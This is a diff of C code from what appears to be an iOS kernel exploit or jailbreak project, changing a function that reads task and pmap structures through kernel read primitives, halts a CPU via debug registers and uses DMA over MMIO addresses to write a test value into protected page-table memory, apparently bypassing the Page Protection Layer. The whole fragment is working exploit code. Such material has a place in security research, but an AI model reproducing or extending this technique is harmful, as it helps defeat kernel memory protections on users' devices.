@@ -417,10 +417,10 @@ void  pplwrite_test(void)
 {
     uint64_t vm_map = kread64_ptr(get_selftask() + 0x28/*off_task_map*/);
     uint64_t pmap= kread64_ptr(vm_map + 0x40/*off_task_map_pmap*/);
-//    uint64_t ttbr0_va_kaddr =kread64(pmap + 0);
-//    uint64_t vm_map1 = kread64_ptr(get_kerntask()+0x28/*off_task_map*/);
-//    uint64_t pmap1= kread64_ptr(vm_map1 + 0x40/*off_task_map_pmap*/);
-//    uint64_t ttbr1_va_kaddr =kread64(pmap1 + 0);
+    uint64_t ttbr0_va_kaddr =kread64(pmap + 0);
+    uint64_t vm_map1 = kread64_ptr(get_kerntask()+0x28/*off_task_map*/);
+    uint64_t pmap1= kread64_ptr(vm_map1 + 0x40/*off_task_map_pmap*/);
+    uint64_t ttbr1_va_kaddr =kread64(pmap1 + 0);
     
     dispatch_queue_t queue = dispatch_queue_create("com.example.my_queue", DISPATCH_QUEUE_SERIAL);
     dispatch_queue_set_specific(queue, CFRunLoopGetMain(), CFRunLoopGetMain(), NULL);
@@ -501,13 +501,13 @@ void  pplwrite_test(void)
                 }
             }
         }
-        uint64_t base6150020= base6150000+0x20;
+        uint64_t base6150020 = base6150000+0x20;
         uint64_t base6150020_back = read_qword(base6150020);
         if (isa15a16) write_qword(base6150020,1); // a15 a16需要
         ml_dbgwrap_halt_cpu(base6040000);
         dma_init(base6140008,base6140108,original_value_0x206140108);
         
-        uint64_t test_p=pmap+0x68; //test write
+        uint64_t test_p=pmap+0x50;
         write_data_with_mmio(test_p,base6150000,mask,i,0x4141414141414141);
         
         dma_done(base6140008,base6140108,original_value_0x206140108);
